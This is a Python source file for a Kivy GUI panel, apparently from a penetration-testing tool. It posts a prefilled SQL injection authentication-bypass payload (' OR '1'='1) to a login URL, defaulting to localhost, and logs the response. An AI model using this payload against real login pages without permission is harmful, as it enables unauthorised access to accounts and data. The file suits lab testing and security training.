import threading
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from gui.global_variables import default_button_height, default_padding_1
from gui.utils.console_view import ConsoleView
from gui.utils.custom_layout import CustomHeightLayout
from gui.utils.text_input_widget import TextInputWidget
import requests


class SqlInjectionView(BoxLayout):
    def __init__(self, console_view: ConsoleView, **kwargs):
        self.console_view = console_view
        super(SqlInjectionView, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 10
        self.spacing = 10

        # Add URL Input Field
        self.url_view = TextInputWidget("http://127.0.0.1:8080/login", "Target URL", "Enter the Target URL")
        self.add_widget(self.url_view)

        # Add Username Field
        self.username_field = TextInputWidget("' OR '1'='1", "SQL Injection Payload (Username)", "Custom SQL injection for username")
        self.add_widget(self.username_field)

        # Add Password Field
        self.password_field = TextInputWidget("password", "Password", "Enter password")
        self.add_widget(self.password_field)

        # Add a spacer to push buttons to the bottom
        self.add_widget(BoxLayout(size_hint_y=1))  # Spacer

        # Button layout at the bottom using CustomHeightLayout
        button_layout = BoxLayout(orientation='vertical', size_hint_y=None)

        # Add Start SQL Injection Button
        start_button_layout = CustomHeightLayout(height=default_button_height)
        self.start_button = Button(text="Start SQL Injection Test")
        self.start_button.bind(on_press=self.start_sql_injection_thread)
        start_button_layout.add_widget(self.start_button)
        button_layout.add_widget(start_button_layout)

        # Add a spacer between buttons
        button_layout.add_widget(Widget(size_hint_y=None, height=default_padding_1))

        # Add the button layout to the main view
        self.add_widget(button_layout)

    def start_sql_injection_thread(self, instance):
        """Start the SQL Injection attack in a separate thread."""
        threading.Thread(target=self.start_sql_injection, daemon=True).start()

    def start_sql_injection(self):
        """Perform the SQL Injection test."""
        # Retrieve target URL, username, and password
        target_url = self.url_view.get_text().strip()
        username = self.username_field.get_text().strip()
        password = self.password_field.get_text().strip()

        # Validate the URL
        if not target_url:
            self.console_view.add_text_schedule("[ERROR] Please enter a valid Target URL before starting the test.")
            return

        self.console_view.add_text_schedule(f"Starting SQL Injection Test on {target_url}...")

        # Prepare the request payload
        parameters = {"username": username, "password": password}

        try:
            # Send the POST request
            response = requests.post(target_url, data=parameters)

            # Log the response and status
            self.console_view.add_text_schedule(f"[INFO] Sent payload: {parameters}")
            self.console_view.add_text_schedule(f"[INFO] Response Status Code: {response.status_code}")
            self.console_view.add_text_schedule(f"[INFO] Response Text: {response.text[:200]}")  # Limit response text
        except Exception as e:
            self.console_view.add_text_schedule(f"[ERROR] Failed to send request: {e}")
